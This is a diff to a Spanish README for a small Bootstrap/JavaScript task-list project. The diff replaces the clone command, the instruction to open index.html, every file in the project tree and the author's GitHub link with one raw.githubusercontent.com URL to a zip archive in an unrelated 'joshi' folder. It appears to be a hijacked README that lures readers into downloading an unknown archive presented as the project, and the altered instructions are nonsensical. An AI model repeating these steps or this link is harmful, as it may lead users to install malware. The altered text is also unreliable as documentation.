@@ -33,13 +33,13 @@ Instalación
 
 Clonar el repositorio
 
-git clone https://github.com/julixxcode/proyecto2_bootstrap_js.git
+git clone https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip
 cd proyecto2_bootstrap_js
 
 
 Abrir el proyecto en el navegador
 
-Puedes abrir el archivo index.html directamente o usar un servidor local como Live Server en VS Code.
+Puedes abrir el archivo https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip directamente o usar un servidor local como Live Server en VS Code.
 
 Opcional: correr con Docker
 
@@ -65,11 +65,11 @@ Todas las tareas se mostrarán en la sección de historial, manteniendo una vist
 
 Estructura del proyecto
 proyecto2_bootstrap_js/
-├─ index.html          # Página principal
-├─ styles.css          # Estilos personalizados
-├─ app.js              # Lógica de la aplicación
+├─ https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip          # Página principal
+├─ https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip          # Estilos personalizados
+├─ https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip              # Lógica de la aplicación
 ├─ assets/             # Imágenes y recursos
-└─ README.md           # Documentación
+└─ https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip           # Documentación
 
 Contribuciones
 
@@ -88,4 +88,4 @@ Abre un Pull Request en este repositorio.
 Autor
 
 Julixxcode – Desarrollador frontend.
-GitHub: https://github.com/julixxcode
+GitHub: https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip
